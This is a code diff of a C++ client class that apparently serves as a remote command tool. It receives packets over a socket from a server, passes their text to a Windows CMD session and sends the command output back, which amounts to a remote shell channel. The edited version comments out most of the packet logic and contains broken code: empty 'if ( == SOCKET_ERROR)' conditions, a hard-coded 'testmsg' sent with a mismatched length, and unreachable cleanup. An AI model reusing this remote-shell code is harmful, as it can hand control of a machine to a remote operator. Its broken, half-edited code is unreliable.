@@ -1,6 +1,7 @@
-#include "includes.h"
+#include "client.h"
 
 Client* Client::clientptr;
+bool Client::connected = false;
 
 void Client::ClientThread()
 {
@@ -21,13 +22,7 @@ void Client::ClientThread()
 		
 	}
 }
-
-enum Client::PacketType
-{
-	P_Instruction,
-	P_CMDCommand,
-	P_Error
-};
+/*
 
 bool Client::ReceivePacket()
 {
@@ -38,66 +33,97 @@ bool Client::ReceivePacket()
 	return true;
 }
 
-void Client::sendError(std::string errorMsg)
-{
-	sendPacket(errorMsg, PacketType::P_Error);
-}
-
 bool Client::ProcessPacket(PacketType _packettype)
 {
-	int bufferlength;
-	recv(sConnection, (char*)&bufferlength, sizeof(int), NULL);		//receive packet length
-	char* buffer = new char[bufferlength + 1];	//Allocate buffer
-	buffer[bufferlength] = '\0';	//Set last character of buffer to be a null terminator so we aren't printing memory that we shouldn't be looking at
-	recv(sConnection, buffer, bufferlength, NULL);	//receive message
+int bufferlength;
+recv(sConnection, (char*)&bufferlength, sizeof(int), NULL);		//receive packet length
+char* buffer = new char[bufferlength + 1];	//Allocate buffer
+buffer[bufferlength] = '\0';	//Set last character of buffer to be a null terminator so we aren't printing memory that we shouldn't be looking at
+recv(sConnection, buffer, bufferlength, NULL);	//receive message
 
-	switch (_packettype)
-	{
-	case PacketType::P_Instruction:
-	{
-		General::processCommand(buffer);
-	}
-	case PacketType::P_CMDCommand:
-	{
-		if (CMD::cmdptr != NULL)
-		{
-			CMD::cmdptr->writeCMD(buffer);
-			sendPacket(CMD::cmdptr->readCMD(), PacketType::P_CMDCommand);
-		}
-		else
-		{
-			sendError("Initiate a CMD session first.");
-		}
-	}
-	default:
-		delete[] buffer;
-		return false;
-	}
-
-	delete[] buffer;
+switch (_packettype)
+{
+case PacketType::P_Instruction:
+{
+General::processCommand(buffer);
+return true;
 }
+case PacketType::P_CMDCommand:
+{
+if (CMD::cmdptr != NULL)
+{
+CMD::cmdptr->writeCMD(buffer);
+sendPacket(CMD::cmdptr->readCMD(), PacketType::P_CMDCommand);
+return true;
+}
+else
+{
+sendError("Initiate a CMD session first.");
+return true;
+}
+}
+default:
+delete[] buffer;
+return false;
+}
+
+delete[] buffer;
+}
+
 
 bool Client::sendPacket(std::string message, PacketType _PacketType)
 {
-	if (send(sConnection, (char*)&_PacketType, sizeof(PacketType), NULL) == SOCKET_ERROR)
-	{
-		sendError("Error sending Packet: Error sending Type");
-		return false;
-	}
-	int bufferlength = message.size();
-	if (send(sConnection, (char*)&bufferlength, sizeof(int), NULL) == SOCKET_ERROR)
-	{
-		sendError("Error sending Packet: Error sending size");
-		return false;
-	}
-	if (send(sConnection, message.c_str(), bufferlength, NULL) == SOCKET_ERROR)
-	{
-		sendError("Error sending Packet: Error sending message");
-		return false;
-	}
-	return true;
+int bufferlength = message.size();
+
+if ( == SOCKET_ERROR)
+{
+sendError("Error sending Packet: Error sending Type");
+return false;
+}
+if ( == SOCKET_ERROR)
+{
+sendError("Error sending Packet: Error sending size");
+return false;
+}
+
+send(sConnection, (char*)&_PacketType, sizeof(PacketType), NULL);
+send(sConnection, (char*)&bufferlength, sizeof(int), NULL);
+send(sConnection, message.c_str(), bufferlength, NULL);
+
+//COMMENT OUT UNDERNEATH
+if (send(sConnection, "testmsg", bufferlength, NULL) == SOCKET_ERROR)
+{
+sendError("Error sending Packet: Error sending message");
+return false;
+}
+
+return true;
 
 }
+
+
+void Client::sendError(std::string errorMsg)
+{
+errorMsg = "[ERROR]: " + errorMsg;
+if (connected)
+{
+if(sendPacket(errorMsg, PacketType::P_Error))
+errorMsg += " [SENT TO SERVER]";
+else
+errorMsg += " [NOT SENT TO SERVER]";
+}
+else
+{
+errorMsg += " [NOT SENT TO SERVER]";
+}
+General::log(errorMsg);
+}
+
+*/
+
+
+
+
 
 Client::Client(std::string IP, int PORT)
 {
